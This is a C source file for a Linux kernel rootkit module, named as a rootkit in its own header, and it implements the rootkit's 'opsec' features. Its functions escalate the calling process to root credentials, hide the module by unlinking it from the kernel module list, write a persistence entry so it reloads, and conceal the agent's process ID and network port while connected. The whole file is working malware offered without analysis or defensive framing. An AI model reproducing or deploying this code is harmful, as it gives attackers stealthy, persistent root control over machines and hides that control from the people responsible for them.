// SPDX-License-Identifier: GPL-2.0
// core/opsec.c - Escalation, module cloaking, persistence.
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <net/inet_sock.h>
#include "rootkit.h"

// Privilege escalation
int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

// Module cloaking
static struct list_head *saved_mod_list;

void rk_cloak(void)
{
	if (saved_mod_list)
		return;
	saved_mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void rk_uncloak(void)
{
	if (!saved_mod_list)
		return;
	list_add(&THIS_MODULE->list, saved_mod_list);
	saved_mod_list = NULL;
}

// Persistence
int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
	filp_close(f, NULL);
	return 0;
}

int rk_unpersist(void)
{
	struct file *f;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_TRUNC, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);
	filp_close(f, NULL);
	return 0;
}

// Auto-hide agent PID and connection port on connect.
void rk_auto_hide(struct socket *sock)
{
	struct inet_sock *inet = inet_sk(sock->sk);
	char buf[8];

	// Hide the agent kthread PID
	snprintf(buf, sizeof(buf), "%d", current->pid);
	rk_target_add(&rk_pid_targets, buf);

	// Hide the local source port from tcp seq show
	snprintf(buf, sizeof(buf), "%hu", ntohs(inet->inet_sport));
	rk_target_add(&rk_port_targets, buf);
}

// Remove auto-hidden entries on disconnect.
void rk_auto_unhide(void)
{
	char buf[8];
	int i;

	// Remove agent PID
	snprintf(buf, sizeof(buf), "%d", current->pid);
	for (i = 0; i < rk_pid_targets.count; i++) {
		if (strcmp(rk_pid_targets.targets[i], buf) == 0) {
			rk_target_remove(&rk_pid_targets, i);
			break;
		}
	}

	// Remove source port (port changes each connection, just remove all auto entries)
	// Since we always add at the end and there's typically only one agent connection,
	// remove the last port entry (the one we added)
	if (rk_port_targets.count > 0)
		rk_target_remove(&rk_port_targets, rk_port_targets.count - 1);
}
